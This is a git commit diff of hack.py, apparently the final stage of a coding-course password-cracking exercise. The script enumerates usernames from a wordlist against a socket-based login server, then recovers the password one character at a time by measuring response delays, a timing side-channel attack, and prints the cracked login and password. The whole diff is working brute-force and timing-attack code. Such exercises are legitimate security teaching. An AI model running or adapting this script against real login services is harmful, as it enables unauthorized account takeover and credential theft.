890c48cb6e1da94c15e5d51c1f56aee7000f2168
Ofir Goaris <ofir.goaris3@gmail.com>
2024-10-05 15:25:51 +0300

    Stage 5/5

--- hack.py
+++ hack.py
@@ -3,6 +3,7 @@ import sys
 import itertools
 import os
 import json
+import time
 
 # Get the command-line arguments
 hostname = sys.argv[1]
@@ -12,14 +13,12 @@ port = int(sys.argv[2])
 password_file_path = os.path.join(os.path.expanduser('~'), 'Downloads', 'passwords.txt')
 login_file_path = os.path.join(os.path.expanduser('~'), 'Downloads', 'logins.txt')
 
-
 # Function to send a JSON request and get the response
 def send_request(socket, login, password):
     request = json.dumps({"login": login, "password": password})
     socket.send(request.encode())
     response = socket.recv(1024).decode()
-    return json.loads(response)
-
+    return response
 
 # Create a socket and connect to the server
 with socket.socket() as client_socket:
@@ -34,34 +33,34 @@ with socket.socket() as client_socket:
 
     # Try all logins with any password
     for login in logins:
+        # Try an arbitrary password (e.g., "password")
         response = send_request(client_socket, login, "password")
 
-        if response["result"] == "Wrong login!":
+        if response.startswith("{\"result\": \"Wrong login!\""):
             continue
-        elif response["result"] == "Wrong password!" or response["result"] == "Exception happened during login":
+        elif response.startswith("{\"result\": \"Wrong password!\"") or response.startswith("{\"result\": \"Exception happened during login\""):
             found_login = login
             break
 
     if found_login:
         found_password = ""
 
-        # Now try to find the password character by character
+        # Try to find the password character by character using time vulnerability
         while True:
             for char in itertools.chain.from_iterable(itertools.product(*([chr(x) for x in range(32, 127)]))):
+                start_time = time.time()
                 response = send_request(client_socket, found_login, found_password + char)
+                end_time = time.time()
 
-                if response["result"] == "Connection success!":
+                # If the server takes longer to respond, it's likely that the password starts with the current symbols
+                if end_time - start_time > 0.1:  # adjust the threshold value as needed
                     found_password += char
                     break
-                elif response["result"] == "Wrong password!":
+                elif response.startswith("{\"result\": \"Connection success!\""):
+                    found_password += char
+                    print(json.dumps({"login": found_login, "password": found_password}))
+                    exit()
+                elif response.startswith("{\"result\": \"Wrong password!\""):
                     continue
-                elif response["result"] == "Exception happened during login":
-                    found_password += char
-                    break
-
-            if response["result"] == "Connection success!":
-                break
-
-        # Print the final combination in JSON format
-        result = json.dumps({"login": found_login, "password": found_password})
-        print(result)
+                elif response.startswith("{\"result\": \"Exception happened during login\""):
+                    continue
